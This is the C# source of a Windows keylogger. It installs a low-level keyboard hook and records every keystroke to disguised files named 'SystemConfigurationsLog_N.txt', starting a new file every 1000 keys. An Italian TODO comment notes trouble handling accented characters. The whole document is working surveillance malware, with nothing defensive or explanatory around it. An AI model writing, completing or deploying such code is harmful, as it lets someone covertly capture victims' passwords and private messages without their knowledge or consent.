using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;

namespace keylogger
{
    internal class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;

        public static void Main(string[] args)
        {
            HookCallbackDelegate hcDelegate = HookCallback;

            string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
            IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

            System.Windows.Forms.Application.Run();

        }

        private static int wordCounter = 0;
        private static int fileCounter = 0;
        private static string actualFile = "SystemConfigurationsLog_" + fileCounter.ToString() + ".txt";

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //TODO 
            /*  capire come stracazzo risolvere il problema di accenti e numeri
             *  recuperando ascii o recuperando il valore e non il nome del tasto premuto
             */
            Console.WriteLine($"{wParam} - {(IntPtr)wParam}");
            Console.Write($"{wParam}, {lParam}, {nCode}");
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.Write($"[{(Keys)vkCode}]");
                if (wordCounter > 1000)
                {
                    wordCounter = 0;
                    fileCounter++;
                    actualFile = "SystemConfigurationsLog_" + fileCounter.ToString() + ".txt";
                }
                InsertKey(vkCode);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static void InsertKey(int vkCode)
        {
            if ($"{(Keys)vkCode}" == "Enter")
                File.AppendAllText(actualFile, "\n");
            else if (($"{(Keys)vkCode}" == "Space"))
                File.AppendAllText(actualFile, " ");
            else
                File.AppendAllText(actualFile, $"{(Keys)vkCode}");
            wordCounter++;
        }

        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

    }
}
